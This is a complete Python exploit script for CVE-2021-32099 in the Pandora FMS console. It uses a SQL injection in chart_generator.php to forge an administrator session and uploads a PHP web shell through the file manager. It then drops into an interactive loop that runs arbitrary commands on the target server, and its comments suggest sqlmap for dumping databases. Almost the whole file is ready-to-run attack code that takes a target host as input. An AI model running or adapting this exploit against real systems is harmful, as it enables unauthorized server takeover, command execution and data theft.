#!/usr/bin/python3

# MIT License

# Copyright (c) 2022 sam

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


# CVE-2021-32099
# Found By dennis brinkrolf
# Blog https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained
# There aren't any exploits found to impersonate so wrote my own
# This sql injection can also be exploited by sqlmap to dump databases :) 

import requests
import argparse
import cmd

parser = argparse.ArgumentParser(description="Exploiting Sqlinjection To impersonate Admin")
parser.add_argument("-t","--target", help=" Host Ip for the Exploiting with target Port" ,required=True)
parser.add_argument("-f","--filename", help="Filename for Shell Upload with php extension",default='pwn.php' )


args = parser.parse_args()
host=args.target
file_name=args.filename
base_path=f'http://{host}/pandora_console'

#Exploit Injection
#http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=' union SELECT 1,2,'id_usuario|s:5:"admin";' as data -- SgGO

print(f"URL:  {base_path}")
print("[+] Sending Injection Payload")
r=requests.get(f'http://{host}/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO')

if r.status_code==200:
    print("[+] Requesting Session")
    Session_Cookie_Admin=r.cookies.get('PHPSESSID')
    print(f'[+] Admin Session Cookie : {Session_Cookie_Admin}')
else :
    print('[+] Error Receiving Admin Cookie , Make sure the url is right or Check the table name using SQLMAP and change the table name in the payload')
##################################################################################################
# Got Cookie now Proceed with Pwning
##################################################################################################
cookies = {
    'PHPSESSID': Session_Cookie_Admin,
}

headers = {
    'Host': host,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'multipart/form-data; boundary=---------------------------308045185511758964171231871874',
    'Content-Length': '1289',
    'Connection': 'close',
    'Referer': f'http://{host}/pandora_console/index.php?sec=gsetup&sec2=godmode/setup/file_manager',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
}

params = (
    ('sec', 'gsetup'),
    ('sec2', 'godmode/setup/file_manager'),
)

data = f'-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="file"; filename="{file_name}"\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET[\'test\']);?>\n\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="umask"\r\n\r\n\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="decompress_sent"\r\n\r\n1\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="go"\r\n\r\nGo\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="real_directory"\r\n\r\n/var/www/pandora/pandora_console/images\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="directory"\r\n\r\nimages\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="hash"\r\n\r\n6427eed956c3b836eb0644629a183a9b\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="hash2"\r\n\r\n594175347dddf7a54cc03f6c6d0f04b4\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="upload_file_or_zip"\r\n\r\n1\r\n-----------------------------308045185511758964171231871874--\r\n'

print('[+] Sending Payload ')
response = requests.post(f'http://{host}/pandora_console/index.php', headers=headers, params=params, cookies=cookies, data=data, verify=False)
StatusCode=response.status_code
print(f'[+] Respose : {StatusCode}')

##################################################################################################
# Cmdline Class
class commandline_args(cmd.Cmd):
    prompt= "CMD > "
    def default(self,args):
        print(cmd_shell(args))

##################################################################################################
# Drop Interactive Shell
##################################################################################################

def cmd_shell(command):
    shell = requests.get(f'http://{host}/pandora_console/images/{file_name}?test={command}')
    return shell.text

try:
    print('[+] Pwned :)')
    print(f'[+] If you want manual Control : http://{host}/pandora_console/images/{file_name}?test=')
    commandline_args().cmdloop()
except KeyboardInterrupt:
    print('\n[+] Exiting!!!!')
    raise SystemExit
if not  StatusCode == 200:
    print('[+] Failed to Get Shell :(')
